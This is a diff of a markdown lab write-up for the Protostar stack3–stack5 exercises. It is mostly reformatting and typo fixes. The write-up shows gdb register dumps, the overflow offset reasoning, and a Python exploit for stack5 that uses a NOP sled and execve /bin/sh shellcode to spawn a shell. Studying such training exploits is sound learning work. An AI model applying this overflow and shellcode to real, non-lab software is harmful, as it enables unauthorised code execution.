@@ -67,110 +67,111 @@ For this section, we will be attempting stack3, stack4 and stack5
 
 - Final Answer
 
-    `python -c "print('A'*76+'\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4" | /opt/protostar/bin/stack4`
+    `python -c "print('A'*76+'\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4`
 
 ### Background for Stack Five
 
-Given the following input string:
+- Given the following input string:
 
-    ```
-    $ python -c "print('A'*76+'B'*20)" > /tmp/output
-    (gdb) set disassembly-flavor intel
-    (gdb) r < /tmp/output
-    Starting program: /opt/protostar/bin/stack5 < /tmp/output
-    
-    Program received signal SIGSEGV, Segmentation fault.
-    0x42424242 in ?? ()
-    (gdb) info registers
-    eax            0xbffffca0	-1073742688
-    ecx            0xbffffca0	-1073742688
-    edx            0xb7fd9334	-1208118476
-    ebx            0xb7fd7ff4	-1208123404
-    esp            0xbffffcf0	0xbffffcf0
-    ebp            0x41414141	0x41414141
-    esi            0x0	0
-    edi            0x0	0
-    eip            0x42424242	0x42424242
-    eflags         0x210246	[ PF ZF IF RF ID ]
-    cs             0x73	115
-    ss             0x7b	123
-    ds             0x7b	123
-    es             0x7b	123
-    fs             0x0	0
-    gs             0x33	51
-    (gdb) x/s $esp
-    0xbffffcf0:	 'B' <repeats 16 times>
-    (gdb) 
-    ```
-    - We know that the padding length is 76 before we start to overwrite eip with 4 'B's.
+	```
+	$ python -c "print('A'*76+'B'*20)" > /tmp/output
+	(gdb) set disassembly-flavor intel
+	(gdb) r < /tmp/output
+	Starting program: /opt/protostar/bin/stack5 < /tmp/output
 
-    - We also know that the rest of our input string overflows to esp as we observe that esp is pointing to 0xbffffcf0 which contains the rest of our 20 - 4  = 16 'B's
+	Program received signal SIGSEGV, Segmentation fault.
+	0x42424242 in ?? ()
+	(gdb) info registers
+	eax            0xbffffca0	-1073742688
+	ecx            0xbffffca0	-1073742688
+	edx            0xb7fd9334	-1208118476
+	ebx            0xb7fd7ff4	-1208123404
+	esp            0xbffffcf0	0xbffffcf0
+	ebp            0x41414141	0x41414141
+	esi            0x0	0
+	edi            0x0	0
+	eip            0x42424242	0x42424242
+	eflags         0x210246	[ PF ZF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb) x/s $esp
+	0xbffffcf0:	 'B' <repeats 16 times>
+	(gdb) 
+	```
 
-    - Hence, what we can do is that, we can overwrite the 4 'B's that overflowed into the eip register to redirect it to the esp address since and we can put shellcode to be executed once the program has been properly redirected.
+	- We know that the padding length is 76 before we start to overwrite eip with 4 'B's.
 
-    - In the past few examples, we hardcode the register values based on what we have reversed. When we do it this way, we will have to reverse the sequence of bytes due to big endian format of computer architecture. Instead, we can use the struct library to help us
+	- We also know that the rest of our input string overflows to esp as we observe that esp is pointing to 0xbffffcf0 which contains the rest of our 20 - 4  = 16 'B's
 
-```
-$ cat ex.py
-import struct
-padding = "A" * 76
-eip = "\xf0\xfc\xff\xbf"
-exploit="\xCC"*1
-#exploit="C"*20
-print padding+eip+exploit
-$ python ex.py > /tmp/output
-...
-(gdb) r < /tmp/output
-Starting program: /opt/protostar/bin/stack5 < /tmp/output
+	- Hence, what we can do is that, we can overwrite the 4 'B's that overflowed into the eip register to redirect it to the esp address since and we can put shellcode to be executed once the program has been properly redirected.
 
-Program received signal SIGTRAP, Trace/breakpoint trap.
-0xbffffcf1 in ?? ()
-(gdb) info registers
-eax            0xbffffca0	-1073742688
-ecx            0xbffffca0	-1073742688
-edx            0xb7fd9334	-1208118476
-ebx            0xb7fd7ff4	-1208123404
-esp            0xbffffcf0	0xbffffcf0
-ebp            0x41414141	0x41414141
-esi            0x0	0
-edi            0x0	0
-eip            0xbffffcf1	0xbffffcf1
-eflags         0x200246	[ PF ZF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/s $esp
-0xbffffcf0:	  <incomplete sequence \314>
-(gdb) x/s $eip
-0xbffffcf1:	 ""
-(gdb) c
-Continuing.
+	- In the past few examples, we hardcode the register values based on what we have reversed. When we do it this way, we will have to reverse the sequence of bytes due to big endian format of computer architecture. Instead, we can use the struct library to help us
 
-Program received signal SIGSEGV, Segmentation fault.
-0xbffffcf3 in ?? ()
-```
+- Writing our first exploit
 
-- So we managed to redirect code execution by overwriting the eip address to the address that esp is pointing to since that is where our overwritten code continues to overflow
+	```
+	$ cat ex.py
+	import struct
+	padding = "A" * 76
+	eip = "\xf0\xfc\xff\xbf"
+	exploit="\xCC"*1
+	#exploit="C"*20
+	print padding+eip+exploit
+	$ python ex.py > /tmp/output
+	...
+	(gdb) r < /tmp/output
+	Starting program: /opt/protostar/bin/stack5 < /tmp/output
 
-- "\xCC" is equivalent to a breakpoint and we observe that when we run the program, it will stop at 0xbffffcf1, which is 1 instruction from the address that $esp is pointing to at 0xbffffcf0. From this, we know that our "\xCC" code is being executed.
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0xbffffcf1 in ?? ()
+	(gdb) info registers
+	eax            0xbffffca0	-1073742688
+	ecx            0xbffffca0	-1073742688
+	edx            0xb7fd9334	-1208118476
+	ebx            0xb7fd7ff4	-1208123404
+	esp            0xbffffcf0	0xbffffcf0
+	ebp            0x41414141	0x41414141
+	esi            0x0	0
+	edi            0x0	0
+	eip            0xbffffcf1	0xbffffcf1
+	eflags         0x200246	[ PF ZF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb) x/s $esp
+	0xbffffcf0:	  <incomplete sequence \314>
+	(gdb) x/s $eip
+	0xbffffcf1:	 ""
+	(gdb) c
+	Continuing.
 
-### Answer for Stack 5
+	Program received signal SIGSEGV, Segmentation fault.
+	0xbffffcf3 in ?? ()
+	```
 
-- Python Code:
+	- So we managed to redirect code execution by overwriting the eip address to the address that esp is pointing to since that is where our overwritten code continues to overflow
+
+	- "\xCC" is equivalent to a breakpoint and we observe that when we run the program, it will stop at 0xbffffcf1, which is 1 instruction from the address that $esp is pointing to at 0xbffffcf0. From this, we know that our "\xCC" code is being executed.
+
+- Answer for Stack 5 (in Python)
 
     ```
     import struct
-    
+
     padding     = "A" * 76
     # eip         = "\xf0\xfc\xff\xbf"
     eip         = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
     breakpoints = "\xCC" * 4
     nopsled     = "\x90" * 100
     exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-    
+
     print padding+eip+nopsled+exploit
     ```
 
@@ -184,9 +185,9 @@ Program received signal SIGSEGV, Segmentation fault.
 
         - In the video that LiveOverflow did the walkthrough, it was due to the environmental variables.
 
-        - When I tried running the exploit in gdb even when I was not in the `/opt/protostar/bin` directory but the `/home/user` directory, the exploit was working in (which should not as shown in the video when LiveOverflow ran stack5 in the `/tmp` directory). Hence, I suspect that there are other factors affecting the reliability of the stack as well.
+        - When I tried running the exploit in gdb even when I was not in the `/opt/protostar/bin` directory but the `/home/user` directory, the exploit was still working (which should not as shown in the video when LiveOverflow ran stack5 in the `/tmp` directory). Hence, I suspect that there are other factors affecting the reliability of the stack as well.
         
-        - When I actually attempted to reset the environmental variables via `set -i` and run the executable with the input string, I would encounter segmentation faults instead of hititng the breakpoint as seen in minute 8:53 of the video (you cam apparently do it in gdb using `(gdb) set exec-wrapper /usr/bin/env -i` as referenced from the comments in the video).
+        - When I actually attempted to reset the environmental variables via `set -i` and run the executable with the input string in bash, I would encounter segmentation faults instead of hititng the breakpoint as seen in minute 8:53 of the video (you can apparently do it in gdb using `(gdb) set exec-wrapper /usr/bin/env -i` as referenced from the comments in the video).
 
     2. You need the `cat` at the end to prevent the shell from closing and also to allow you to pipe commands in after you have executed `/bin/sh` shellcode in the stack buffer!
 
